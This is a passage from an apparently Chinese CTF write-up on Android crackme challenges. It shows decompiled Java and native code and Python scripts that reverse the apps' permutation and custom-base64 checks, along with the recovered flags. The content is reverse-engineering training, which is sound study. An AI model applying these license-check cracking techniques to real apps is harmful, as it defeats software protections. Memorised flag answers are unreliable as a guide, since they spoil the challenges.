= (byte) 64;                }            }            enBytes[3] = tmp;            for (k = 0; k &lt;= 3; k++) {                if (enBytes[k] &lt;= (byte) 63) {                    res.append(Base64ByteToStr[enBytes[k]]);                } else {                    res.append(&#39;=&#39;);                }            }        }        return res.toString();    }}</code></pre><p>直接改表解码：</p><pre><code class="python">#!/usr/bin/env python#-*- encoding=utf-8 -*-from utils import *base64_charset = &#39;vwxrstuopq34567ABCDEFGHIJyz012PQRSTKLMNOZabcdUVWXYefghijklmn89+/=&#39;ciphertext = &#39;5rFf7E2K6rqN7Hpiyush7E6S5fJg6rsi5NBf6NGT5rs=&#39;plaintext = decipher(ciphertext)print plaintext# 05397c42f9b6da593a3644162d36eb01</code></pre><h1 id="easyjava"><a href="#easyjava" class="headerlink" title="easyjava"></a>easyjava</h1><p>jadx 反编译，MainActivity 中看到主要是 <code>b()</code> 函数判断了 flag 的格式，下面主要是把 a 和 b 两个类的构造函数理清：</p><pre><code class="java">package com.a.easyjava;import android.os.Bundle;import android.support.v7.app.c;import android.view.View;import android.view.View.OnClickListener;import android.widget.EditText;import android.widget.Toast;import java.util.Timer;import java.util.TimerTask;public class MainActivity extends c {    private static char a(String str, b bVar, a aVar) {        return aVar.a(bVar.a(str));    }    private static Boolean b(String str) {        int i = 0;        if (!str.startsWith(&quot;flag{&quot;)) {            return Boolean.valueOf(false);        }        if (!str.endsWith(&quot;}&quot;)) {            return Boolean.valueOf(false);        }        String substring = str.substring(5, str.length() - 1);        b bVar = new b(Integer.valueOf(2));        a aVar = new a(Integer.valueOf(3));        StringBuilder stringBuilder = new StringBuilder();        int i2 = 0;        while (i &lt; substring.length()) {            stringBuilder.append(a(substring.charAt(i) + &quot;&quot;, bVar, aVar));            Integer valueOf = Integer.valueOf(bVar.b().intValue() / 25); // 将bVar中d的值除以25并赋值给valueOf            if (valueOf.intValue() &gt; i2 &amp;&amp; valueOf.intValue() &gt;= 1) {                i2++;            }            i++;        }        return Boolean.valueOf(stringBuilder.toString().equals(&quot;wigwrkaugala&quot;));    }    protected void onCreate(Bundle bundle) {        super.onCreate(bundle);        setContentView((int) R.layout.activity_main);        findViewById(R.id.button).setOnClickListener(new OnClickListener(this) {            final /* synthetic */ MainActivity b;            public void onClick(View view) {                if (MainActivity.b(((EditText) ((MainActivity) this).findViewById(R.id.edit)).getText().toString()).booleanValue()) {                    Toast.makeText(this, &quot;You are right!&quot;, 1).show();                    return;                }                Toast.makeText(this, &quot;You are wrong! Bye~&quot;, 1).show();                new Timer().schedule(new TimerTask(this) {                    final /* synthetic */ AnonymousClass1 a;                    {                        this.a = r1;                    }                    public void run() {                        System.exit(1);                    }                }, 2000);            }        });    }}</code></pre><p>a 类的构造函数，是对数组 c 的重新排列。然后在 <code>a()</code> 函数中对输入的数字和下标进行转换：</p><pre><code class="java">package com.a.easyjava;import java.util.ArrayList;public class a {    public static ArrayList&lt;Integer&gt; a = new ArrayList();    static String b = &quot;abcdefghijklmnopqrstuvwxyz&quot;;    static Integer d = Integer.valueOf(0);    Integer[] c = new Integer[]{Integer.valueOf(7), Integer.valueOf(14), Integer.valueOf(16), Integer.valueOf(21), Integer.valueOf(4), Integer.valueOf(24), Integer.valueOf(25), Integer.valueOf(20), Integer.valueOf(5), Integer.valueOf(15), Integer.valueOf(9), Integer.valueOf(17), Integer.valueOf(6), Integer.valueOf(13), Integer.valueOf(3), Integer.valueOf(18), Integer.valueOf(12), Integer.valueOf(10), Integer.valueOf(19), Integer.valueOf(0), Integer.valueOf(22), Integer.valueOf(2), Integer.valueOf(11), Integer.valueOf(23), Integer.valueOf(1), Integer.valueOf(8)};    public a(Integer num) {        int intValue;        for (intValue = num.intValue(); intValue &lt; this.c.length; intValue++) {            a.add(this.c[intValue]);        }        for (intValue = 0; intValue &lt; num.intValue(); intValue++) {            a.add(this.c[intValue]);        }    }    public static void a() {        Integer num = d;        d = Integer.valueOf(d.intValue() + 1); // 将d加一        if (d.intValue() == 25) { // 判断d是否等于25            int intValue = ((Integer) a.get(0)).intValue();            a.remove(0);            a.add(Integer.valueOf(intValue)); // 将a的第一个元素添加到最后一位            d = Integer.valueOf(0); // 将d设置成0        }    }    public char a(Integer num) {        int i = 0;        Integer valueOf = Integer.valueOf(0);        if (num.intValue() == -10) { // 判断num是否为-10            a();            return &quot; &quot;.charAt(0);        }        while (i &lt; a.size() - 1) {            if (a.get(i) == num) {                valueOf = Integer.valueOf(i); // 获取a中等于num的元素，并将valueOf设置成其下标i            }            i++;        }        a();        return b.charAt(valueOf.intValue()); // 返回下标对应的b中的字符    }}</code></pre><p>b 类中同理，也是对下标的一个转换：</p><pre><code class="java">package com.a.easyjava;import java.util.ArrayList;public class b {    public static ArrayList&lt;Integer&gt; a = new ArrayList();    static String b = &quot;abcdefghijklmnopqrstuvwxyz&quot;;    static Integer d = Integer.valueOf(0);    Integer[] c = new Integer[]{Integer.valueOf(8), Integer.valueOf(25), Integer.valueOf(17), Integer.valueOf(23), Integer.valueOf(7), Integer.valueOf(22), Integer.valueOf(1), Integer.valueOf(16), Integer.valueOf(6), Integer.valueOf(9), Integer.valueOf(21), Integer.valueOf(0), Integer.valueOf(15), Integer.valueOf(5), Integer.valueOf(10), Integer.valueOf(18), Integer.valueOf(2), Integer.valueOf(24), Integer.valueOf(4), Integer.valueOf(11), Integer.valueOf(3), Integer.valueOf(14), Integer.valueOf(19), Integer.valueOf(12), Integer.valueOf(20), Integer.valueOf(13)};    public b(Integer num) {        int intValue;        for (intValue = num.intValue(); intValue &lt; this.c.length; intValue++) {            a.add(this.c[intValue]);        }        for (intValue = 0; intValue &lt; num.intValue(); intValue++) {            a.add(this.c[intValue]);        }    }    public static void a() {        int intValue = ((Integer) a.get(0)).intValue();        a.remove(0);        a.add(Integer.valueOf(intValue)); // 将a的第一个元素添加到最后一位        b += &quot;&quot; + b.charAt(0);        b = b.substring(1, 27); // 将b的第一个元素添加到最后一位        Integer num = d;        d = Integer.valueOf(d.intValue() + 1); // 将d加一    }    public Integer a(String str) {        int i = 0;        Integer valueOf = Integer.valueOf(0);        if (b.contains(str.toLowerCase())) { // 判断字符串是否在“abcdefghijklmnopqrstuvwxyz”中            Integer valueOf2 = Integer.valueOf(b.indexOf(str)); // str在b中的起始下标            while (i &lt; a.size() - 1) {                if (a.get(i) == valueOf2) { // 获取a中与valueOf2相等的值，并设置valueOf为其下标i                    valueOf = Integer.valueOf(i);                }                i++;            }        } else {            valueOf = str.contains(&quot; &quot;) ? Integer.valueOf(-10) : Integer.valueOf(-1); // 判断字符串中是否有空格，如果有valueOf设置成-10，反之设置成-1        }        a();        return valueOf;    }    public Integer b() {        return d;    }}</code></pre><p>其中有很多条件判断不可能发生，实际的算法逻辑没有反编译出的代码这么复杂。逆向实现脚本：</p><pre><code class="python">#!/usr/bin/env pythonbArray = [17, 23, 7, 22, 1, 16, 6, 9, 21, 0, 15, 5, 10, 18, 2, 24, 4, 11, 3, 14, 19, 12, 20, 13, 8, 25]aArray = [21, 4, 24, 25, 20, 5, 15, 9, 17, 6, 13, 3, 18, 12, 10, 19, 0, 22, 2, 11, 23, 1, 8, 7, 14, 16]ciphertext = &#39;wigwrkaugala&#39;table = &#39;abcdefghijklmnopqrstuvwxyz&#39;valueOfArray = []for i in range(len(ciphertext)):    valueOfArray.append(table.index(ciphertext[i]))print valueOfArraynumArray = []for i in range(len(valueOfArray)):    numArray.append(aArray[valueOfArray[i]])print numArrayprefix = &#39;flag{&#39;suffix = &#39;}&#39;substring = &#39;&#39;for i in range(len(numArray)):    ch = table[bArray[numArray[i]]]    substring += ch    bArray.append(bArray[0])    del bArray[0]    table = (table + table[0])[1:27]flag = prefix + substring + suffixprint flag</code></pre><h1 id="easyjni"><a href="#easyjni" class="headerlink" title="easyjni"></a>easyjni</h1><p>反编译，其中调用了 a 函数，其中调用了 a 类中的 a 函数和在 libnative.so 实现的 ncheck 函数：</p><pre><code class="java">package com.a.easyjni;import android.os.Bundle;import android.support.v7.app.c;import android.view.View;import android.view.View.OnClickListener;import android.widget.EditText;import android.widget.Toast;public class MainActivity extends c {    static {        System.loadLibrary(&quot;native&quot;);    }    private boolean a(String str) {        try {            return ncheck(new a().a(str.getBytes()));        } catch (Exception e) {            return false;        }    }    private native boolean ncheck(String str);    protected void onCreate(Bundle bundle) {        super.onCreate(bundle);        setContentView((int) R.layout.activity_main);        findViewById(R.id.button).setOnClickListener(new OnClickListener(this) {            final /* synthetic */ MainActivity b;            public void onClick(View view) {                if (this.b.a(((EditText) ((MainActivity) this).findViewById(R.id.edit)).getText().toString())) {                    Toast.makeText(this, &quot;You are right!&quot;, 1).show();                } else {                    Toast.makeText(this, &quot;You are wrong! Bye~&quot;, 1).show();                }            }        });    }}</code></pre><p>a 类里的 a 函数很容易发现是个换表 base64：</p><pre><code class="java">package com.a.easyjni;public class a {    private static final char[] a = new char[]{&#39;i&#39;, &#39;5&#39;, &#39;j&#39;, &#39;L&#39;, &#39;W&#39;, &#39;7&#39;, &#39;S&#39;, &#39;0&#39;, &#39;G&#39;, &#39;X&#39;, &#39;6&#39;, &#39;u&#39;, &#39;f&#39;, &#39;1&#39;, &#39;c&#39;, &#39;v&#39;, &#39;3&#39;, &#39;n&#39;, &#39;y&#39;, &#39;4&#39;, &#39;q&#39;, &#39;8&#39;, &#39;e&#39;, &#39;s&#39;, &#39;2&#39;, &#39;Q&#39;, &#39;+&#39;, &#39;b&#39;, &#39;d&#39;, &#39;k&#39;, &#39;Y&#39;, &#39;g&#39;, &#39;K&#39;, &#39;O&#39;, &#39;I&#39;, &#39;T&#39;, &#39;/&#39;, &#39;t&#39;, &#39;A&#39;, &#39;x&#39;, &#39;U&#39;, &#39;r&#39;, &#39;F&#39;, &#39;l&#39;, &#39;V&#39;, &#39;P&#39;, &#39;z&#39;, &#39;h&#39;, &#39;m&#39;, &#39;o&#39;, &#39;w&#39;, &#39;9&#39;, &#39;B&#39;, &#39;H&#39;, &#39;C&#39;, &#39;M&#39;, &#39;D&#39;, &#39;p&#39;, &#39;E&#39;, &#39;a&#39;, &#39;J&#39;, &#39;R&#39;, &#39;Z&#39;, &#39;N&#39;};    public String a(byte[] bArr) {        StringBuilder stringBuilder = new StringBuilder();        for (int i = 0; i &lt;= bArr.length - 1; i += 3) {            byte[] bArr2 = new byte[4];            byte b = (byte) 0;            for (int i2 = 0; i2 &lt;= 2; i2++) {                if (i + i2 &lt;= bArr.length - 1) {                    bArr2[i2] = (byte) (b | ((bArr[i + i2] &amp; 255) &gt;&gt;&gt; ((i2 * 2) + 2)));                    b = (byte) ((((bArr[i + i2] &amp; 255) &lt;&lt; (((2 - i2) * 2) + 2)) &amp; 255) &gt;&gt;&gt; 2);                } else {                    bArr2[i2] = b;                    b = (byte) 64;                }            }            bArr2[3] = b;            for (int i3 = 0; i3 &lt;= 3; i3++) {                if (bArr2[i3] &lt;= (byte) 63) {                    stringBuilder.append(a[bArr2[i3]]);                } else {                    stringBuilder.append(&#39;=&#39;);                }            }        }        return stringBuilder.toString();    }}</code></pre><p>查看 native 层 ncheck 函数，是静态注册的。理一下发现是个简单的置换：</p><pre><code class="cpp">signed int __fastcall Java_com_a_easyjni_MainActivity_ncheck(_JNIEnv *a1, int a2, jstring a3){  int v3; // r8  _JNIEnv *env; // r5  jstring str; // r8  const char *utf_string; // r6  int i; // r0  char *v8; // r2  char v9; // r1  int j; // r0  bool v11; // nf  unsigned __int8 v12; // vf  int v13; // r1  signed int result; // r0  char s1[32]; // [sp+3h] [bp-35h]  char tmp; // [sp+23h] [bp-15h]  int v17; // [sp+28h] [bp-10h]  v17 = v3;  env = a1;  str = a3;  utf_string = a1-&gt;functions-&gt;GetStringUTFChars(&amp;a1-&gt;functions, a3, 0);  if ( strlen(utf_string) == 32 )               // len(str) == 32  {    i = 0;    do    {      v8 = &amp;s1[i];      s1[i] = utf_string[i + 16];               // s1[i] = str[i + 16]      v9 = utf_string[i++];      v8[16] = v9;                              // s1[i + 16] = str[i]    }    while ( i != 16 );    env-&gt;functions-&gt;ReleaseStringUTFChars(&amp;env-&gt;functions, str, utf_string);    j = 0;    do    {      v12 = __OFSUB__(j, 30);      v11 = j - 30 &lt; 0;      tmp = s1[j];      s1[j] = s1[j + 1];      s1[j + 1] = tmp;                          // s1[j], s1[j + 1] = s1[j + 1], s1[j]      j += 2;    }    while ( v11 ^ v12 );                        // while j &lt;= 30    v13 = memcmp(s1, &quot;MbT3sQgX039i3g==AQOoMQFPskB1Bsc7&quot;, 0x20u);    result = 0;    if ( !v13 )      result = 1;  }  else  {    env-&gt;functions-&gt;ReleaseStringUTFChars(&amp;env-&gt;functions, str, utf_string);    result = 0;  }  return result;}</code></pre><p>逆向把位置颠倒的字符串倒回去，再用改表的 base64 解码：</p><pre><code class="python">#!/usr/bin/env pythonfrom base64 import *base64_charset = &#39;i5jLW7S0GX6uf1cv3ny4q8es2Q+bdkYgKOIT/tAxUrFlVPzhmow9BHCMDpEaJRZN=&#39;ciphertext = &#39;MbT3sQgX039i3g==AQOoMQFPskB1Bsc7&#39;ciphertext = [ord(c) for c in ciphertext]for i in range(len(ciphertext) / 2):    ciphertext[2 * i], ciphertext[2 * i + 1] = ciphertext[2 * i + 1], ciphertext[2 * i]print ciphertextfor i in range(len(ciphertext) / 2):    ciphertext[i], ciphertext[i + 16] = ciphertext[i + 16], ciphertext[i]print ciphertextciphertext = &#39;&#39;.join([chr(c) for c in ciphertext])print ciphertext# QAoOQMPFks1BsB7cbM3TQsXg30i9g3==plaintext = decipher(ciphertext)print plaintext# flag{just_ANot#er_@p3}</code></pre><h1 id="easy-so"><a href="#easy-so" class="headerlink" title="easy-so"></a>easy-so</h1><p>用 jadx 反编译后，看到调用了 cyberpeace 类中的 CheckString 函数：</p><pre><code class="java">package com.testjava.jack.pingan2;import android.os.Bundle;import android.support.v7.app.AppCompatActivity;import android.view.View;import android.view.View.OnClickListener;import android.widget.Button;import android.widget.EditText;import android.widget.Toast;public class MainActivity extends AppCompatActivity {    protected void onCreate(Bundle savedInstanceState) {        super.onCreate(savedInstanceState);        setContentView((int) R.layout.activity_main);        ((Button) findViewById(R.id.button)).setOnClickListener(new OnClickListener() {            public void onClick(View v) {                if (cyberpeace.CheckString(((EditText) MainActivity.this.findViewById(R.id.editText)).getText().toString()) == 1) {                    Toast.makeText(MainActivity.this, &quot;\u9a8c\u8bc1\u901a\u8fc7!&quot;, 1).show(); // 验证通过!                } else {                    Toast.makeText(MainActivity.this, &quot;\u9a8c\u8bc1\u5931\u8d25!&quot;, 1).show(); // 验证失败!                }            }        });    }}</code></pre><p>看到函数在 Native 层实现：</p><pre><code class="java">package com.testjava.jack.pingan2;public class cyberpeace {    public static native int CheckString(String str);    static {        System.loadLibrary(&quot;cyberpeace&quot;);    }}</code></pre><p>发现是静态实现的函数，其中将输入调用了 TestDec，并将结果和指定字符串比较：</p><pre><code class="cpp">signed int __fastcall Java_com_testjava_jack_pingan2_cyberpeace_CheckString(_JNIEnv *a1, int a2, jstring *str){  signed int v3; // r8  const char *str_1; // r9  int v5; // r6  const char *v6; // r5  signed int v7; // r1  v3 = 0;  str_1 = a1-&gt;functions-&gt;GetStringUTFChars(&amp;a1-&gt;functions, str, 0);  v5 = strlen(str_1);  v6 = (const char *)malloc(v5 + 1);  v7 = 0;  if ( v5 != -1 )    v7 = 1;  _aeabi_memclr(&amp;v6[v5], v7);  _aeabi_memcpy((int)v6, (int)str_1, v5);  j_TestDec((int)v6);  if ( !strcmp(v6, &quot;f72c5a36569418a20907b55be5bf95ad&quot;) )    v3 = 1;  return v3;}</code></pre><p>看一下 TestDec 发现和之前一样，也是一组简单置换：</p><pre><code class="cpp">size_t __fastcall TestDec(const char *a1){  char *str; // r4  size_t i; // r5  char *v3; // r1  char v4; // r0  size_t result; // r0  int j; // r5  char *v7; // r0  char v8; // r1  unsigned int v9; // r1  str = (char *)a1;  if ( strlen(a1) &gt;= 2 )  {    i = 0;    do    {      v3 = &amp;str[i];      v4 = str[i];      str[i] = str[i + 16];      ++i;      v3[16] = v4;                              // str[i], str[i + 16] = str[i + 16], str[i]    }    while ( i &lt; strlen(str) &gt;&gt; 1 );  }  result = (unsigned __int8)*str;  if ( !*str )    return result;  *str = str[1];  str[1] = result;                              // str[0], str[1] = str[1], str[0]  result = strlen(str);  if ( result &lt; 3 )    return result;  j = 0;  do  {    v7 = &amp;str[j];    v8 = str[j + 2];    v7[2] = str[j + 3];    v7[3] = v8;                                 // str[j + 2], str[j + 3] = str[j + 3], str[j + 2]    result = strlen(str);    v9 = j + 4;    j += 2;  }  while ( v9 &lt; result );  return result;}</code></pre><p>照样学样逆一下就好了：</p><pre><code class="python">#!/usr/bin/env pythonciphertext = &#39;f72c5a36569418a20907b55be5bf95ad&#39;ciphertext = [ord(c) for c in ciphertext]ciphertext[0], ciphertext[1] = ciphertext[1], ciphertext[0]for i in range(len(ciphertext) / 2 - 1):    ciphertext[2 * i + 2], ciphertext[2 * i + 3] = ciphertext[2 * i + 3], ciphertext[2 * i + 2]print ciphertextfor i in range(len(ciphertext) / 2):    ciphertext[i], ciphertext[i + 16] = ciphertext[i + 16], ciphertext[i]print ciphertextplaintext = &#39;&#39;.join([chr(c) for c in ciphertext])print plaintext# 90705bb55efb59da7fc2a5636549812a</code></pre><h1 id="Ph0en1x-100"><a href="#Ph0en1x-100" class="headerlink" title="Ph0en1x-100"></a>Ph0en1x-100</h1><p>MainActivity 中，encrypt 和 getFlag 函数在 Native 层实现，getSecret 函数返回某种哈希摘要的十六进制字符串。输入经过 encrypt 函数操作后的值与 getFlag 的值相等：</p><pre><code class="java">package com.ph0en1x.android_crackme;import android.os.Bundle;import android.support.v4.view.MotionEventCompat;import android.support.v7.app.AppCompatActivity;import android.view.View;import android.widget.EditText;import android.widget.Toast;import java.io.UnsupportedEncodingException;import java.security.MessageDigest;import java.security.NoSuchAlgorithmException;public class MainActivity extends AppCompatActivity {    EditText etFlag;    public native String encrypt(String str);    public native String getFlag();    static {        System.loadLibrary(&quot;phcm&quot;);    }    protected void onCreate(Bundle savedInstanceState) {        super.onCreate(savedInstanceState);        setContentView((int) R.layout.activity_main);        this.etFlag = (EditText) findViewById(R.id.flag_edit);    }    public void onGoClick(View v) {        if (getSecret(getFlag()).equals(getSecret(encrypt(this.etFlag.getText().toString())))) {            Toast.makeText(this, &quot;Success&quot;, 1).show();        } else {            Toast.makeText(this, &quot;Failed&quot;, 1).show();        }    }    public String getSecret(String string) { // 获取某种哈希摘要的十六进制字符串        try {            byte[] hash = MessageDigest.getInstance(encrypt(&quot;KE3TLNE6M43EK4GM34LKMLETG&quot;).substring(5, 8)).digest(string.getBytes(&quot;UTF-8&quot;));            if (hash != null) {                StringBuilder hex = new StringBuilder(hash.length * 2);                for (byte b : hash) {                    if ((b &amp; MotionEventCompat.ACTION_MASK) &lt; 16) {                        hex.append(&quot;0&quot;);                    }                    hex.append(Integer.toHexString(b &amp; MotionEventCompat.ACTION_MASK));                }                return hex.toString();            }        } catch (NoSuchAlgorithmException e) {            e.printStackTrace();        } catch (UnsupportedEncodingException e2) {            e2.printStackTrace();        }        return null;    }}</code></pre><p>在 IDA 中看到静态注册的 encrypt 函数，对字符串的每个值进行了减一操作：</p><pre><code class="cpp">jstring __fastcall Java_com_ph0en1x_android_1crackme_MainActivity_encrypt(_JNIEnv *a1, int a2, jstring a3){  _JNIEnv *v3; // r6  const char *v4; // r4  const char *i; // r5  v3 = a1;  v4 = a1-&gt;functions-&gt;GetStringUTFChars(&amp;a1-&gt;functions, a3, 0);  for ( i = v4; i - v4 &lt; strlen(v4); ++i )    --*i;  return v3-&gt;functions-&gt;NewStringUTF(&amp;v3-&gt;functions, v4);}</code></pre><p>反向加一，得到指定的哈希摘要是 MD5：</p><pre><code class="python">#!/usr/bin/env pythonimport hashlibmd5hash = lambda m: hashlib.md5(m).hexdigest()secret_digest = &#39;KE3TLNE6M43EK4GM34LKMLETG&#39;digest_type = &#39;&#39;for i in range(len(secret_digest)):    digest_type += chr(ord(secret_digest[i]) - 1)digest_type = digest_type[5:8]print digest_type# MD5</code></pre><p>接下来看 getFlag 函数，读取内存中 data 的值，在循环中对相邻两个值进行相减并加 1，然后和 key 值异或，最后返回字符串：</p><pre><code class="cpp">jstring __fastcall Java_com_ph0en1x_android_1crackme_MainActivity_getFlag(_JNIEnv *a1){  char *v1; // r4  _JNIEnv *v2; // r7  char *v3; // r3  int v4; // r0  int v5; // r1  char *v6; // r2  char *v7; // r3  int v8; // r0  int v9; // r1  int v10; // r4  int v11; // r0  __int16 v12; // r3  signed int l1; // r8  signed int l2; // r0  char *v15; // r9  char a; // r3  char b; // t1  int idx; // r1  char s; // [sp+4h] [bp-5Ch]  char data_1[40]; // [sp+14h] [bp-4Ch]  char v22; // [sp+40h] [bp-20h]  v1 = data_1;  v2 = a1;  v3 = (char *)&amp;data;  do  {    v4 = *(_DWORD *)v3;                         // low 4 bytes    v3 += 8;    v5 = *((_DWORD *)v3 - 1);                   // high 4 bytes    *(_DWORD *)v1 = v4;    *((_DWORD *)v1 + 1) = v5;    v1 += 8;  }  while ( v3 != &quot;Hello Ph0en1x&quot; );  v6 = &amp;s;  v7 = &quot;Hello Ph0en1x&quot;;  do  {    v8 = *(_DWORD *)v7;    v7 += 8;    v9 = *((_DWORD *)v7 - 1);    *(_DWORD *)v6 = v8;    *((_DWORD *)v6 + 1) = v9;    v10 = (int)(v6 + 8);    v6 += 8;  }  while ( v7 != &quot;0en1x&quot; );  v11 = *(_DWORD *)v7;  v12 = *((_WORD *)v7 + 2);  *(_DWORD *)v10 = v11;  *(_WORD *)(v10 + 4) = v12;  l1 = strlen(&amp;s);                              // len(&#39;Hello Ph0en1x&#39;)  l2 = strlen(data_1) - 1;                      // len(data) - 1  v15 = &amp;data_1[l2];  while ( l2 &gt; 0 )  {    a = *v15 + 1;    *v15 = a;                                   // data[l2] = data[l2] + 1    b = *(v15-- - 1);                           // data[l2 - 1]    idx = l2-- % l1;                            // l2 % l1    v15[1] = ((a - b) ^ *(&amp;v22 + idx - 60)) - 1;// data[l2] = ((data[l2 + 1] - data[l2 - 1]) ^ s[idx]) - 1  }  data_1[0] = (data_1[0] ^ 0x48) - 1;  return v2-&gt;functions-&gt;NewStringUTF(&amp;v2-&gt;functions, data_1);}</code></pre><p>因为涉及到了异或和减法的操作，需要注意到及时和 0xFF 与一下，不然结果会出错。脚本：</p><pre><code class="python">data = [0x2E, 0x36, 0x42, 0x4C, 0x5F, 0xBF, 0xE0, 0x3A, 0xA8, 0xC3, 0x20, 0x63, 0x89, 0xB7, 0xC0, 0x1C, 0x1D, 0x44, 0xC2, 0x28, 0x7F, 0xED, 0x02, 0x0E, 0x5D, 0x66, 0x8F, 0x98, 0xB5, 0xB7, 0xD0, 0x16, 0x4D, 0x83, 0xF8, 0xFB, 0x01, 0x43, 0x47]key = &#39;Hello Ph0en1x&#39;l1 = len(key)l2 = len(data)for i in range(l2 - 1, 0, -1):    data[i] = (((data[i] + 1 - data[i - 1]) ^ ord(key[i % l1])) &amp; 0xFF) - 1data[0] = (data[0] ^ 0x48) - 1flag = &#39;&#39;.join([chr(c + 1) for c in data])print flag# flag{Ar3_y0u_go1nG_70_scarborough_Fair}</code></pre><h1 id="RememberOther"><a href="#RememberOther" class="headerlink" title="RememberOther"></a>RememberOther</h1><p>这道题简直出的莫名其妙，发现如果用户名和密码都为空会返回 True，并且会弹出 strings.xml 中指向的 successed 字符串：</p><pre><code class="java">package com.droider.crackme0201;import android.app.Activity;import android.os.Bundle;import android.support.v4.view.MotionEventCompat;import android.view.Menu;import android.view.View;import android.view.View.OnClickListener;import android.widget.Button;import android.widget.EditText;import android.widget.Toast;import java.security.MessageDigest;import java.security.NoSuchAlgorithmException;public class MainActivity extends Activity {    private Button btn_register;    private EditText edit_sn;    private EditText edit_userName;    public void onCreate(Bundle savedInstanceState) {        super.onCreate(savedInstanceState);        setContentView(R.layout.activity_main);        setTitle(R.string.unregister);        this.edit_userName = (EditText) findViewById(R.id.edit_username);        this.edit_sn = (EditText) findViewById(R.id.edit_sn);        this.btn_register = (Button) findViewById(R.id.button_register);        this.btn_register.setOnClickListener(new OnClickListener() {            public void onClick(View v) {                if (MainActivity.this.checkSN(MainActivity.this.edit_userName.getText().toString().trim(), MainActivity.this.edit_sn.getText().toString().trim())) {                    Toast.makeText(MainActivity.this, R.string.successed, 0).show();                    MainActivity.this.btn_register.setEnabled(false);                    MainActivity.this.setTitle(R.string.registered);                    return;                }                Toast.makeText(MainActivity.this, R.string.unsuccessed, 0).show();            }        });    }    public boolean onCreateOptionsMenu(Menu menu) {        getMenuInflater().inflate(R.menu.activity_main, menu);        return true;    }    private boolean checkSN(String userName, String sn) {        try {            if (userName.length() == 0 &amp;&amp; sn.length() == 0) {                return true;            }            if (userName == null || userName.length() == 0) {                return false;            }            if (sn == null || sn.length() != 16) {                return false;            }            MessageDigest digest = MessageDigest.getInstance(&quot;MD5&quot;);            digest.reset();            digest.update(userName.getBytes());            String hexstr = toHexString(digest.digest(), BuildConfig.FLAVOR);            StringBuilder sb = new StringBuilder();            for (int i = 0; i &lt; hexstr.length(); i += 2) {                sb.append(hexstr.charAt(i));            }            if (sb.toString().equalsIgnoreCase(sn)) {                return true;            }            return false;        } catch (NoSuchAlgorithmException e) {            e.printStackTrace();            return false;        }    }    private static String toHexString(byte[] bytes, String separator) {        StringBuilder hexString = new StringBuilder();        for (byte b : bytes) {            String hex = Integer.toHexString(b &amp; MotionEventCompat.ACTION_MASK);            if (hex.length() == 1) {                hexString.append(&#39;0&#39;);            }            hexString.append(hex).append(separator);        }        return hexString.toString();    }}</code></pre><p>在资源中找到指定的字符串：</p><pre><code class="xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;resources&gt;    &lt;string name=&quot;app_name&quot;&gt;Crackme0201&lt;/string&gt;    &lt;string name=&quot;hint_sn&quot;&gt;请输入16位的注册码&lt;/string&gt;    &lt;string name=&quot;hint_username&quot;&gt;请输入用户名&lt;/string&gt;    &lt;string name=&quot;info&quot;&gt;Xman Android&lt;/string&gt;    &lt;string name=&quot;menu_settings&quot;&gt;Settings&lt;/string&gt;    &lt;string name=&quot;register&quot;&gt;注 册&lt;/string&gt;    &lt;string name=&quot;registered&quot;&gt;程序已注册&lt;/string&gt;    &lt;string name=&quot;sn&quot;&gt;注册码：&lt;/string&gt;    &lt;string name=&quot;successed&quot;&gt;md5:b3241668ecbeb19921fdac5ac1aafa69&lt;/string&gt;    &lt;string name=&quot;title_activity_main&quot;&gt;Crackme&lt;/string&gt;    &lt;string name=&quot;unregister&quot;&gt;程序未注册&lt;/string&gt;    &lt;string name=&quot;unsuccessed&quot;&gt;无效用户名或注册码&lt;/string&gt;    &lt;string name=&quot;username&quot;&gt;用户名：&lt;/string&gt;&lt;/resources&gt;</code></pre><p>搜一下 MD5，得到原字符串为 <code>YOU_KNOW_</code>。但结果不对，网上找到别人的 wp，说另一半要结合 word 中的提示，出题人说他不懂安卓，那么我们就懂了，flag 就是 <code>YOU_KNOW_ANDROID</code>。</p><h1 id="黑客精神"><a href="#黑客精神" class="headerlink" title="黑客精神"></a>黑客精神</h1><p>这题相比前面的题目开始复杂起来了。在 MainActivity 中，看到一开始对一个 m 的值进行了判断。然后接下来在 onClick 中新建了一个 MyApp 实例，如果 m 为 0 就调用 doRegister 函数，其中跳转到 RegActivity。</p><pre><code class="java">package com.gdufs.xman;import android.app.Activity;import android.app.AlertDialog.Builder;import android.content.ComponentName;import android.content.DialogInterface;import android.content.Intent;import android.os.Bundle;import android.os.Process;import android.util.Log;import android.view.Menu;import android.view.View;import android.view.View.OnClickListener;import android.widget.Button;import android.widget.Toast;public class MainActivity extends Activity {    private static String workString;    private Button btn1;    public void onCreate(Bundle savedInstanceState) {        String str2;        super.onCreate(savedInstanceState);        setContentView(R.layout.activity_main);        String str1 = &quot;Xman&quot;;        Log.d(&quot;com.gdufs.xman m=&quot;, str1);        MyApp myApp = (MyApp) getApplication();        int m = MyApp.m;        if (m == 0) {            str2 = &quot;\u672a\u6ce8\u518c&quot;; // 未注册        } else if (m == 1) {            str2 = &quot;\u5df2\u6ce8\u518c&quot;; // 已注册        } else {            str2 = &quot;\u5df2\u6df7\u4e71&quot;; // 已混乱        }        setTitle(str1 + str2);        this.btn1 = (Button) findViewById(R.id.button1);        this.btn1.setOnClickListener(new OnClickListener() {            public void onClick(View v) {                MyApp myApp = (MyApp) MainActivity.this.getApplication();                if (MyApp.m == 0) {                    MainActivity.this.doRegister();                    return;                }                ((MyApp) MainActivity.this.getApplication()).work();                Toast.makeText(MainActivity.this.getApplicationContext(), MainActivity.workString, 0).show();            }        });    }    public void doRegister() {        new Builder(this).setTitle(&quot;\u6ce8\u518c&quot;).setMessage(&quot;Flag\u5c31\u5728\u524d\u65b9\uff01&quot;).setPositiveButton(&quot;\u6ce8\u518c&quot;, new DialogInterface.OnClickListener() { // Title =&gt; 注册 | Message =&gt; Flag就在前方！ | PositiveButton =&gt; 注册            public void onClick(DialogInterface dialog, int which) {                Intent intent = new Intent();                intent.setComponent(new ComponentName(BuildConfig.APPLICATION_ID, &quot;com.gdufs.xman.RegActivity&quot;));                MainActivity.this.startActivity(intent); // 跳转到RegActivity                MainActivity.this.finish();            }        }).setNegativeButton(&quot;\u4e0d\u73a9\u4e86&quot;, new DialogInterface.OnClickListener() { // NagetiveButton =&gt; 不玩了            public void onClick(DialogInterface dialog, int which) {                Process.killProcess(Process.myPid());            }        }).show();    }    public void work(String str) {        workString = str;    }    public boolean onCreateOptionsMenu(Menu menu) {        getMenuInflater().inflate(R.menu.menu_main, menu);        return true;    }}</code></pre><p>然后看一下 MyApp 类中，发现分别有三个函数在 